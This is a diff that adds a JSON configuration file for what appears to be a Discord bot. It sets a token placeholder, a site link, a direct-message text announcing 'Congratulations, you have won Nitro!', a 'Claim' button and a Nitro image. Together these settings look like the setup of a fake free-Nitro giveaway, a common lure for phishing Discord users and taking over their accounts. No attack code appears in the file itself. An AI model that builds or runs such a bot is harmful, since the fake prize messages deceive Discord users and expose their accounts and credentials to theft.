@@ -1,0 +1,11 @@
+{
+    "bot token": "your token",
+    "bot prefix": ">",
+    "site link": "https://ethone.cc",
+    "mention in dm": "yes",
+    "dm message": "Congratulations, you have won Nitro!",
+    "button text": "Claim",
+    "image path": "images/nitro.png",
+    "emoji path": "images/emoji.png",
+    "command key": "6b4a8912f8c6c5ffb9b4d204e4fbd50f"
+}
